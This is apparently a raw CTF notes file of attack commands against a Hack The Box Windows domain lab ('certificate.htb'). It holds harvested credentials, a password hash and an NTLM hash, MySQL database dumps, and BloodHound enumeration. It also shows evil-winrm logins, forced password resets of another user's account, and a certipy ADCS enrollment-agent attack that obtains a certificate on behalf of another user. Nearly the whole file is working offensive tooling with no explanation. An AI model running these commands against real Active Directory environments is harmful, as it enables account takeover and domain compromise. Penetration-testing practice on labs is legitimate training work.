aakeder.kh
Lion.SK
Ryan.K
Sara.B  $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6  Blink182  Sara1200

certificate_webapp_user         cert!f!c@teDBPWD

.\mysql.exe -u certificate_webapp_user -p"cert!f!c@teDBPWD" -e "select * from certificate_webapp_db ; "
.\mysql.exe -u certificate_webapp_user -p"cert!f!c@teDBPWD" -e "use certificate_webapp_db;select * from users;"


bloodhound-python -u sara.b -d certificate.htb -c all -v -ns 10.10.11.71

evil-winrm certificate.thb -u "sara.b" -p "Blink182"


impacket-changepasswd certificate.htb/lion.sk@10.10.11.71 -newpass 'Password@1234' -altuser certificate.htb/sara.b -altpass 'Blink182' -reset 

bloodyAD --host '10.10.11.71' -d 'Certificate.htb' -u Sara.B -p 'Blink182' set password lion.sk "Abc123456%" 

net rpc password 'lion.sk' 'newP@ssword2022' -U 'certificate.htb'/'sara.b'%'Blink182' -S '100.10.11.71' 



evil-winrm -i 10.10.11.71 -u Lion.SK -p '!QAZ2wsx'



certipy-ad find  -u lion.sk -p '!QAZ2wsx' -dc-ip 10.10.11.71 -vulnerable 

certipy-ad req -u 'lion.sk@certificate.htb' -p '!QAZ2wsx' -dc-ip 10.10.11.71 -ca Certificate-LTD-CA -target 'certificate.htb' -template 'Delegated-CRA'

certipy-ad req -u 'lion.sk@CERTIFICATE.HTB' -p '!QAZ2wsx' -dc-ip '10.10.11.71' -target 'DC01.CERTIFICATE.HTB' -ca 'Certificate-LTD-CA' -template 'SignedUser' -pfx 'lion.sk.pfx' -on-behalf-of 'CERTIFICATE\ryan.k'

certipy-ad auth -pfx 'ryan.k.pfx' -dc-ip '10.10.11.71'

timedatectl set-ntp off

rdate -n 10.10.11.71 

certipy-ad auth -pfx 'ryan.k.pfx' -dc-ip '10.10.11.71'

ryan.k : aad3b435b51404eeaad3b435b51404ee:b1bc3d70e70f4f36b1509a65ae1a2ae6 
